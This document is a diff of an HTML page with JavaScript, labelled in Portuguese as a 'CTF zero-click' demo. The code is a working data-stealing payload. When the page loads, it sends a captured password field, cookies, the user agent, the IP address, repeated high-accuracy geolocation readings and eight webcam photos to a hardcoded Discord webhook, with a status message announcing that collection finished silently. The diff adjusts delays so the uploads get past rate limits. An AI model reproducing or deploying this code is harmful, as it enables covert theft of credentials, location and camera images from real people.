@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Demo CTF Zero-Click Fotos</title>
+    <title>Demo CTF Zero-Click Corrigido</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f0f0f0; }
-        h1 { color: #ff0000; font-size: 16px; opacity: 0.7; } /* Sutil */
-        #status { font-size: 10px; color: #00aa00; margin-top: 5px; } /* Discreto */
+        h1 { color: #ff0000; font-size: 16px; opacity: 0.7; }
+        #status { font-size: 10px; color: #00aa00; margin-top: 5px; }
     </style>
 </head>
 <body>
@@ -15,10 +15,10 @@
     <div id="status">Inicializando...</div>
 
     <script>
-        // Configuração do webhook (use seu Discord ou webhook.site)
+        // Webhook do Discord (use webhook.site para teste se falhar)
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
 
-        // Função para enviar item individual ao webhook (multipart/form-data)
+        // Função para enviar item individual (multipart/form-data para anexos)
         async function sendItemToServer(type, data, index = null) {
             try {
                 const formData = new FormData();
@@ -28,13 +28,15 @@
                         fields: [
                             { name: 'Type', value: type },
                             { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
-                            { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1024) }
+                            { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1024) }  // Limite para embeds
                         ],
                         timestamp: new Date().toISOString()
                     }]
                 }));
                 if (type.includes('Photo')) {
-                    const blob = await (await fetch(data.base64)).blob();
+                    // Converter base64 para blob para anexo
+                    const response = await fetch(data.base64);
+                    const blob = await response.blob();
                     formData.append('file', blob, `photo_${index + 1}.webp`);
                 }
 
@@ -42,7 +44,8 @@
                     method: 'POST',
                     body: formData
                 });
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                console.log(`Enviado ${type} com sucesso`);  // Log discreto para debug
                 return true;
             } catch (e) {
                 console.error(`Erro ao enviar ${type}: ${e.message}`);
@@ -68,15 +71,15 @@
 
             // Enviar senha
             await sendItemToServer('Senha Simulada', { password: data.formData });
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 2000));  // Delay 2s para rate limit
 
             // Enviar cookies
             await sendItemToServer('Cookies', { cookies: data.cookies });
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 2000));
 
             // Enviar userAgent
             await sendItemToServer('User-Agent', { userAgent: data.userAgent });
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 2000));
 
             // Enviar IP
             try {
@@ -86,9 +89,9 @@
             } catch (e) {
                 await sendItemToServer('IP', { error: 'Erro ao coletar IP' });
             }
-            await new Promise(resolve => setTimeout(resolve, 500));
+            await new Promise(resolve => setTimeout(resolve, 2000));
 
-            // Coletar localização
+            // Coletar localização (4 updates)
             if (navigator.geolocation) {
                 for (let i = 0; i < 4; i++) {
                     await new Promise(resolve => {
@@ -110,7 +113,7 @@
                             { enableHighAccuracy: true, timeout: 2000 }
                         );
                     });
-                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    await new Promise(resolve => setTimeout(resolve, 2000));  // Delay entre localizações
                 }
             } else {
                 await sendItemToServer('Localização', { error: 'Geolocation não suportado' });
@@ -119,7 +122,7 @@
             collectPhotos();
         }
 
-        // Função para coletar 8 fotos
+        // Função para coletar 8 fotos (corrigida)
         async function collectPhotos() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 await sendItemToServer('Câmera', { error: 'Câmera não suportada' });
@@ -141,14 +144,14 @@
                     canvas.width = 320;
                     canvas.height = 240;
                     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.3));
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.3));  // WebP comprimido
                     const reader = new FileReader();
                     const photo = await new Promise(resolve => {
                         reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                         reader.readAsDataURL(blob);
                     });
                     await sendItemToServer(`Photo ${i + 1}`, photo, i);
-                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    await new Promise(resolve => setTimeout(resolve, 2000));  // Delay 2s entre fotos para rate limit
                 }
                 stream.getTracks().forEach(track => track.stop());
                 document.getElementById('status').innerHTML = 'Coleta concluída silenciosamente!';
